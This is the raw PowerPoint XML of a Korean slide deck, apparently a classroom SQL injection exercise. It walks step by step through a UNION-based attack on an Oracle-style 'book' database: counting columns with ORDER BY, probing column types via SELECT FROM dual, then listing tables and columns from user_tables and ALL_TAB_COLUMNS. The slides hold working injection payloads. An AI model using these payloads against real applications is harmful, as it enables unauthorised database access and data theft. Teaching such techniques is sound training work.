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E2DE1-EC26-22FB-F58C-D4F003FAB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FA777B-75E3-8A8C-1B3F-66AD4E13C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FC2765-BDFB-D44A-25CB-6D5CDDBB9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0DF7F-26F3-78AA-1626-F54ED2397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901E30-F5A7-689E-DA0B-9A0B88A9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454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404BA-2B04-F2C6-0467-1F004553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6B918-ECB8-EB63-9174-82D56AD69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D0B19-2F68-AE81-E874-3CBBDA97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9CFB3-D2EF-A3B7-B886-E034211B6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648951-F391-4EAF-0285-4B44C6C1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922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59DC8-7CAD-F5AE-4B3A-2A02B915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AA7BCF-F68D-DF6E-643C-D0E91265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A58DB-27F6-560B-E378-74F9CA6F5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C0105E-125D-8647-A68C-64253981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50EA01-C7C8-212E-968F-D71B3A73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249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A5248-0F22-59D6-EEB5-52C441A46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6B5E41-83CA-0CA4-168E-6D34506EE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517661-5B37-7868-47FE-B56721EC7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C29D5B-F043-3442-94CC-35C1C685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D46744-9F06-8AE8-0979-3A8F55DC3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E8F988-A302-1717-D727-7DA3C1EC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854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B2C63-264E-B97C-7E6C-308A83866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D96EAD-E3D0-7C83-B01F-E8544AE65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252F0-598B-E9E1-7760-B40EF62D1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0A06A5-AF3C-086C-28BE-90BA9B63A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E9BF58-B5F8-E771-F2F4-907F69238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5AAF98-E249-D5E7-9873-4FCA132B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A341B1-B9D5-ED89-C36B-5CCBA7CC4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9CB4D4-BA7C-094C-AECC-76B69D765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5460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5EEA4-F4E9-1CAA-A9DC-52A06C9F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F33036-AE4F-5B95-A6E9-728FAF98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25B2EF-4C6E-62D9-CF7E-B80A0DDC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A0DF68-3E85-BA8C-6B80-89ED94D42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107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D28E22-E2A2-0FFF-59D4-26E5C960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25ED0B-C75F-439E-6161-FA9E5566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FB122-E2DA-A221-5015-8FC119433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4074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C807B-D419-83EE-4D06-99B3D88D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F9B93-116D-656C-57CC-8767BCA0B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97C853-81D6-4F21-82CA-67BA3CE75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5B8509-AF4B-99F3-111A-7EC86321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3E033C-D02B-23C4-99DD-E3736F24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307374-0FD5-0BED-9BB7-818DA824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2562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47DF5-D2D1-DD14-7CEC-F6BF5BDD0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38FA318-3D60-0AFC-5975-CEF932E1E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982486-0A93-57D1-E793-B4C47B4E9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5F1BC2-886D-1184-9FBF-88A6A4E9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EBE4D0-F1C5-D17F-9263-981F590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B7E07E-1EA7-0240-A63D-AA07F0F4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192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8913A-DBBD-9F64-D3D0-28006FEA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6F3C75-3B06-87B5-7E9A-1BD03305F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CD46E-9515-4B1D-72A5-4ABA0016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E59538-D825-DEC2-EE47-BE52CAD9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296075-2797-E21A-9932-E9C7CBBE3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288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3366DF-E55D-3CA9-6635-E45A6BA88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8062D-1A82-2627-B1B3-9C3333435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80D32A-77C4-B205-4DA6-4F686725A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A0E59E-633F-0757-B535-993E94DA8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5CB91F-A4AF-0905-1CDE-FF3D1E48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568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61290D-1F4F-C95A-563F-E6FE7069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FAC1D3-5B9C-93CE-B1E1-CEDB712C4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1EE38-24D4-E01B-FCCF-17AE464D7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897DC-F8A6-6B46-9C52-0BE2C2B0D14B}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" smtClean="0"/>
              <a:t>2026. 9. 2.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7529-2125-6166-165A-DC037B232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31F65B-F772-59F6-7716-E4AC4A645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D72FD-2213-0F4B-9246-B27E3DE586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8456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CB200-300F-7CE4-2DBB-2EF0D18FA9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SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>연습문제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B619D5-7BD8-0349-AEDD-47D39D54F2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3941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B2B622-EDAC-94C0-DEFF-BC57EC641881}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265814" y="276446"/>
            <a:ext cx="88745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취약점 분석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lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>애플리케이션이 사용자 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>입력값을</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t> 검증 없이 SQL 쿼리에 동적으로 결합(+)하고 있어 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>인젝션</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t> 취약점이 존재함을 확인</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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80C9C-0906-6A90-3156-5E15CCDF7E97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265814" y="1435395"/>
            <a:ext cx="7346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2.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 공경방식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lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>두 개 이상의 쿼리 결과를 하나로 합치는 UNION SELECT 기법을 사용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52B4E-A10E-95DA-D1F5-A28473499234}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265814" y="2317345"/>
            <a:ext cx="102244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3.</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 진행 과정 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>ORDER BY 구문으로 원본 쿼리의 컬럼 개수를 먼저 파악한 뒤, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>USER_TAB_COLUMNS를</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t> 조회하여 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>book</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t> 테이블의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>컬럼명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>, 타입</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 데이터</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>를 알아</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>낸 후 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>해당 컬럼명을 기반으로 2차 공격을 수행하여 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>실제 데이터를 탈취.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7579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D43709-F2D2-DFED-5423-254002AF6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3000" dirty="0"/>
              <a:t>' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0" err="1"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0"/>
              <a:t> 1=1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0" err="1"/>
              <a:t>order</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0" err="1"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="3000" dirty="0"/>
              <a:t> 7 --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="30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3F08509-8755-95D2-1052-5CEDD6461C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56493"/>
            <a:ext cx="5181600" cy="3289602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1ADB93C-4A60-038A-F9D6-24ABF0FCC2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788651"/>
            <a:ext cx="5181600" cy="24252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2A948B-FC1A-2CB7-1E9D-44A29E8851D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="794946" y="1654258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컬럼 수가 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>개임을 확인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40692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E05BB-5124-0BF1-6CEC-32B9A6D2B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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>null,null,null,null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null,null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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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C920281-40AE-DAC7-44A6-DF69AAC22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362" y="1825625"/>
            <a:ext cx="9545276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7AA7A5-433A-4634-47D2-771E73558237}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="132135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공격 시작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71746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E29E8-0F36-5E08-D309-CE81B36ED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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>null,null,null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null,null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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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4F5C238-0D0E-16AE-AF05-68D94C5F3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500" y="1905794"/>
            <a:ext cx="9271000" cy="4191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DEB915-11E2-B553-F305-40F97BA7A59C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1428909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첫 번째 컬럼은 문자</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3482958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AA50D-1123-1798-A014-2A07B0ED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64DC9-3358-F499-2190-1DCFA61E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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’b’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>null,null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null,null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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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F937F2A-50CF-2A24-F79C-38DE13927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350" y="1969294"/>
            <a:ext cx="9385300" cy="406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08ECC6-EB7F-CEF7-DA87-5979AA068E31}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1460659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두 번째 컬럼은 문자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38911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A0DB2-25C5-35BD-C080-317116447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B75630-0523-7F61-8C7D-CA6B4E154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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’b’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,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null,null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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="28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9D0BE2-155E-C00E-5512-A0CF11AE0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‘c＇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66D8E705-948F-3D91-0EBA-D685941755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188642"/>
            <a:ext cx="5157787" cy="2317453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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F976357-51FC-6C36-F288-006EF1CFC4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37596A96-928C-0A84-A2B4-56FBEDB7227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225903"/>
            <a:ext cx="5183188" cy="22429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3BF248-5C2D-D190-901C-2FE21210693E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="836612" y="1351905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세 번째 컬럼은 숫자</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2576815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211BC-729C-2F9C-A173-FDAF1AFAD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76515-E605-F4DE-1980-AD6560D2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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’b’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’c’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null,null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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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E403B68-9CEE-06C5-C5E1-05BD7BB33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6700" y="1867694"/>
            <a:ext cx="9118600" cy="426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92A463-BCFA-F18A-4242-693F8A1E0354}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1321356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네 번째 컬럼은 문자</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1104692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55434-B1DC-D583-C7B7-FB3274CF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6CDBEEA-ACF0-A724-C91F-87683BBE5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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’b’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’c’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2800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F4628F8-6CC1-F148-47D9-12C04DEAE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‘d’</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0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51D31983-2760-AE20-5E9B-E46D2DCCFC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179875"/>
            <a:ext cx="5157787" cy="2334988"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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3C0C14F2-5D25-B954-380E-1E343F98D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pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="내용 개체 틀 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5132E7DF-71F7-70F5-4E7E-13FC778FBC1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118507"/>
            <a:ext cx="5183188" cy="245772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405B2CE-5ABB-4A7C-2040-61A2A529F285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="836612" y="1343137"/>
            <a:ext cx="40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다섯 번째 컬럼은 문자도 숫자도 아님</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2009061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ED31C-ECD4-2942-FB90-57B614C64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B0B80-FAA6-2E30-F381-A0CB13C3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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>‘a’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’b’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>’c’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>,’e’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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>dual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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30AA80B-85F2-402B-98FF-CF6D72F03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0050" y="1829594"/>
            <a:ext cx="8851900" cy="434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8C8FB0-F157-6825-9C76-5EB1AC096B2F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1321356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여섯 번째 컬럼은 문자</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2206328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059F9-2469-0C61-9E63-2FC8CACA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831" y="40219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2200" dirty="0"/>
              <a:t>＇</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>or 1=1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>table_name,null,null,null,null,null</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>user_tables</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2200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C6F7E52F-CA96-34C5-8405-2B9F608A7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568" y="1825625"/>
            <a:ext cx="10394863" cy="4351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D0CA0C-E5B6-C1B6-69C1-3426E81F16EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1456293"/>
            <a:ext cx="6557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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>USER_TABLES’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>을</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 이용하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" dirty="0"/>
              <a:t>테이블 정보에서 테이블 명만 추출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8828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9AB19-A993-45F8-EB49-327815A5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200" dirty="0"/>
              <a:t>' OR 1=1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>data_type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> ALL_TAB_COLUMNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>‘Book</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2200" dirty="0"/>
              <a:t>' --</a:t>
            </a:r>
